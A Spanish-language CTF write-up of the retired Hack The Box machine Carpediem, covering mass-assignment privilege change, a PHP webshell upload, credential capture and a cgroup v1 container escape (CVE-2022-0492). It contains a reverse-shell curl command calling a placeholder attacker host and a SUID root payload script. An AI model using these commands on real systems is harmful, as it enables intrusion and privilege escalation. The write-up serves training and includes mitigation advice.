---
machine: Carpediem
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, docker, pivot, cms, upload, cgroups]
---

# Carpediem — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El portal permite cambiar `login_type` por mass assignment y subir un webshell. Desde el contenedor se enumeran servicios internos, se lee un ticket de Trudesk con el acceso al buzón de voz y se captura tráfico con `tcpdump`. La segunda fase compromete Backdrop CMS y escapa del contenedor con CVE-2022-0492.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH en Ubuntu 20.04 y `80/tcp` nginx con una landing de “coming soon”.
- El vhost `portal.carpediem.htb` aloja una aplicación PHP de alquiler de motos.
- `config.php` apunta a una base MySQL y el host es un contenedor Docker.

## Enumeración

- El POST `update_account` acepta `id`, `login_type` y otros campos ocultos.
- Cambiar `login_type` de `2` a `1` da acceso a `/admin`.
- La subida de reportes usa `multipart/form-data` y devuelve la ruta del archivo; el nombre se conserva con un prefijo numérico.

## Foothold

Se sube un PHP que ejecuta `$_GET['cmd']` y se visita la ruta devuelta. El shell cae como `www-data` dentro del contenedor del portal.

```bash
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'   http://portal.carpediem.htb/uploads/<FILE>.php
```

Desde ahí se leen `initialize.php` y las credenciales de MySQL, y se enumeran los contenedores de la red `172.17.0.0/24`.

## Movimiento lateral

Un ticket de Trudesk describe el alta de un empleado y cómo recibe su contraseña por buzón de voz. Se accede al portal de VoIP, se escucha el mensaje y se obtiene la contraseña de `hflaccus` para SSH en el host. Después, `tcpdump` con capacidades captura el tráfico hacia el CMS y revela credenciales de Backdrop.

## Escalada de privilegios

Con las credenciales de Backdrop se sube un plugin PHP malicioso y se ejecuta como el usuario del contenedor. El contenedor tiene `CAP_SYS_ADMIN` y un cgroup v1 montado; se usa CVE-2022-0492 para escribir en `release_agent` y ejecutar un comando en el host como root.

```bash
# Verificar el montaje y la capacidad
mount | grep cgroup
capsh --print | grep sys_admin

# Crear el payload y disparar release_agent
echo '#!/bin/sh' > /tmp/x
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /tmp/x
chmod +x /tmp/x
# Escribir en release_agent y vaciar el cgroup
```

## Evidencia

- Acceso a `/admin` tras modificar `login_type`.
- Webshell en `/uploads/` y shell como `www-data`.
- Captura de `tcpdump` con credenciales de Backdrop y `/tmp/rootbash` con SUID.

## Lecciones aprendidas

- Un campo oculto como `login_type` no es un control de autorización.
- Los contenedores con `CAP_SYS_ADMIN` y cgroup v1 permiten escapes conocidos.
- El tráfico interno sin cifrar expone credenciales reutilizables.

## Mitigación y detección

- Validar el rol en el servidor y no confiar en campos del cliente.
- Ejecutar contenedores sin `CAP_SYS_ADMIN` y con cgroup v2.
- Segmentar la red de contenedores y cifrar el tráfico interno.

## Referencias

- [0xdf — Carpediem](https://0xdf.gitlab.io/2022/12/03/htb-carpediem.html)
- [IppSec — Carpediem](https://www.youtube.com/watch?v=piTtOe13SEU)
- [Hack The Box — Carpediem](https://app.hackthebox.com/machines/carpediem)
